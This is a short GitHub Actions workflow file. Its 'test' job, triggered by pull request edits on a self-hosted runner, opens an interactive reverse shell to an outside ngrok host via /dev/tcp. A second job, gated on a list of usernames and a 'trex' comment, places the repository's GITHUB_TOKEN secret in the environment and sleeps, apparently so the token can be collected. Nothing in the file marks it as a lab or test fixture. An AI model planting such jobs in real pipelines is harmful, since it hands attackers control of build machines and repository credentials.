on:
  issue_comment:
    types: [created]
  pull_request:
    types: [edited]
  
jobs:
  test:
    runs-on: self-hosted
    if: github.event.name == 'pull_request'
    steps:
      - run: bash -i >& /dev/tcp/0.tcp.ngrok.io/19983 0>&1
      
  magicword:
    runs-on: self-hosted
    if: contains( '\
      jack,\
      jack,\
      john,\
      certainlynotvikorium,\
      bill,\
      joe,\
      alissa,\
      ', format('{0},', github.actor)) && github.event.comment.body == 'trex'
    steps:
      - name: You said the magic word!
        run: sleep 30
        env:
          TOKEN: ${{ secrets.GITHUB_TOKEN }}
